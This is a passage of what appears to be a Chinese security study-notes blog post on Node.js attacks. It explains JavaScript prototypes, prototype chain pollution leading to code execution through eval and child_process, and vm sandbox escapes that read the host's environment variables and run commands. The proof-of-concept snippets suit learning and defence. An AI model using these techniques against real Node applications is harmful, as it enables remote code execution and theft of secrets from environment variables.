+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params">name,age</span>)&#123;<br>	<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=name;<br>	<span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>=age;<br>&#125;<br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;I&#x27;m &quot;</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>+<span class="hljs-string">&quot; And I&#x27;m &quot;</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>);<br>&#125;<br><br><br><span class="hljs-keyword">var</span> fn=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>(<span class="hljs-string">&#x27;xiaoming&#x27;</span>,<span class="hljs-number">19</span>);<br>fn.<span class="hljs-title function_">toString</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fn.<span class="hljs-property">toString</span>===<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">toString</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fn.<span class="hljs-property">__proto__</span>===<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>===<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>===<span class="hljs-literal">null</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/image-20220307155913395.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="2-2-原型链污染原理"><a href="#2-2-原型链污染原理" class="headerlink" title="2.2 原型链污染原理"></a>2.2 原型链污染原理</h3><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// 修改foo的原型（即Object）</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br><br><span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// 此时再用Object创建一个空的zoo对象</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br><br><span class="hljs-comment">// 查看zoo.bar，此时bar为2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-3-原型链污染配合RCE"><a href="#2-3-原型链污染配合RCE" class="headerlink" title="2.3 原型链污染配合RCE"></a>2.3 原型链污染配合RCE</h3><p>有原型链污染的前提之下，我们可以控制基类的成员，赋值为一串恶意代码，从而造成代码注入。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;open /System/Applications/Calculator.app/\&#x27;);&#x27;</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">eval</span>(zoo.<span class="hljs-property">bar</span>))<br></code></pre></td></tr></table></figure>
+
+<p>2.4 </p>
+<h2 id="3-vm沙箱逃逸"><a href="#3-vm沙箱逃逸" class="headerlink" title="3 vm沙箱逃逸"></a>3 vm沙箱逃逸</h2><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸</p>
+<p>逃逸例子：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> env = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox = &#123;&#125;;<br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;</span>);<br><span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>env = script.<span class="hljs-title function_">runInContext</span>(context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env);<br></code></pre></td></tr></table></figure>
+
+<p>执行以上两个例子之后可以获取到主程序环境中的环境变量（两个例子代码等价）</p>
+<p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p>
+<p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p>
+<p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> env = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();</span><br><span class="hljs-string">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env);<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#学习笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>nodejs</div>
+      <div>http://example.com/2022/09/28/nodejs/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>So1Lupus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年9月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/12/20/w1r3s/" title="w1r3s">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">w1r3s</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022029346号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
